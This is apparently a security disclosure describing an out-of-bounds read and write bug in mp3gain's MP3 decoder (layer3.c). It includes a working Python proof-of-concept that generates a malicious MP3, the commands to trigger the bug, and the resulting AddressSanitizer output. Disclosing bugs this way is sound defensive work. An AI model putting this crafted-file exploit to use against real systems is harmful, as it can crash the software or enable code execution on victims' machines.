## Bug0: OOB Read in bandInfo.longIdx Cascades to Unbounded OOB Write in III_dequantize_sample

In `III_get_side_info_1()` in `mpglibDBL/layer3.c` (line 403), the index `r0c+1+r1c+1` computed from unchecked 4-bit and 3-bit bitstream fields can reach 24 while `bandInfo[sfreq].longIdx` has only 23 elements, causing an out-of-bounds read that corrupts `region2start` and subsequently triggers a near-unbounded out-of-bounds write loop in `III_dequantize_sample()` when the derived `l[1]` value becomes negative.

### PoC

Craft a malicious MP3 file using the Python script below and process it with the ASAN-instrumented mp3gain binary to trigger the vulnerability.

```python
#!/usr/bin/env python3
import struct
import os

def bits_to_bytes(bit_str: str) -> bytes:
    pad = (8 - len(bit_str) % 8) % 8
    padded = bit_str + '0' * pad
    result = bytearray()
    for i in range(0, len(padded), 8):
        result.append(int(padded[i:i+8], 2))
    return bytes(result)


def build_side_info_mono() -> bytes:
    bits = ""

    # Header fields
    bits += format(0,   '09b')  # main_data_begin = 0
    bits += format(0,   '05b')  # private_bits
    bits += format(0,   '04b')  # scfsi for ch=0, gr[1]

    # Two granules, identical
    for _gr in range(2):
        bits += format(100, '012b')  # part2_3_length = 100
        bits += format(100, '09b')   # big_values = 100  <- ensures bv > region2
        bits += format(100, '08b')   # global_gain = 100
        bits += format(0,   '04b')   # scalefac_compress
        bits += '0'                  # window_switching_flag = 0
        bits += format(1,   '05b')   # table_select[0] = 1
        bits += format(1,   '05b')   # table_select[1] = 1
        bits += format(1,   '05b')   # table_select[2] = 1
        bits += format(15,  '04b')   # r0c = 15 <- OOB trigger (r0c+1+r1c+1 = 24)
        bits += format(7,   '03b')   # r1c = 7  <- OOB trigger
        bits += '0'                  # preflag
        bits += '0'                  # scalefac_scale
        bits += '0'                  # count1table_select

    assert len(bits) == 136
    data = bits_to_bytes(bits)
    assert len(data) == 17
    return data


# MPEG1 Layer3 128 kbps 44100 Hz Mono, no CRC
# Frame size = floor(144 * 128000 / 44100) = 417 bytes
HEADER     = bytes([0xFF, 0xFB, 0x90, 0xC0])
FRAME_SIZE = 417
SIDE_INFO  = build_side_info_mono()
MAIN_DATA  = bytes(FRAME_SIZE - len(HEADER) - len(SIDE_INFO))

assert len(MAIN_DATA) == 396
FRAME = HEADER + SIDE_INFO + MAIN_DATA
assert len(FRAME) == FRAME_SIZE

mp3_bytes = FRAME * 3

with open("poc_input.mp3", "wb") as fh:
    fh.write(mp3_bytes)

print(f"[+] Wrote {len(mp3_bytes)} bytes to poc_input.mp3")
print(f"[+] r0c=15, r1c=7 -> longIdx[24] aliases longDiff[1]=4 -> region2start=2")
print(f"[+] big_values=100 -> l[1]=2-81=-79 (negative, triggers OOB write loop)")
```

```bash
python3 gen.py
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log" ./build_test/mp3gain poc_input.mp3 || true
for f in ./asan.log.*; do grep -E "AddressSanitizer|ERROR:|runtime error:" "$f" || true; done
```

**Result:** mpglibDBL/layer3.c:403:58: runtime error: index 24 out of bounds for type 'short int [23]'
==562435==ERROR: AddressSanitizer: global-buffer-overflow on address 0x55e603bf4d58 at pc 0x55e603bd3f85 bp 0x7ffc5a112d70 sp 0x7ffc5a112d60
READ of size 4 at 0x55e603bf4d58 thread T0
    #0 0x55e603bd3f84 in III_dequantize_sample
    #1 0x55e603be0fb9 in do_layer3
0x55e603bf4d58 is located 0 bytes to the right of global variable 'pretab2' defined in 'mpglibDBL/layer3.c:651:18' (0x55e603bf4d00) of size 88
SUMMARY: AddressSanitizer: global-buffer-overflow in III_dequantize_sample

### Impact

An attacker can supply a crafted MP3 file with maximally set `r0c` and `r1c` side-information fields to cause an out-of-bounds read that corrupts `region2start`, which then drives a loop in `III_dequantize_sample()` to execute approximately 2^32 iterations of out-of-bounds writes past the `xr` buffer, destroying adjacent global state including `wordpointer` and `bitindex`. This vulnerability is exposed on any invocation of mp3gain against an untrusted MP3 file and can lead to denial of service through process crash or, under favorable memory layouts, arbitrary code execution.
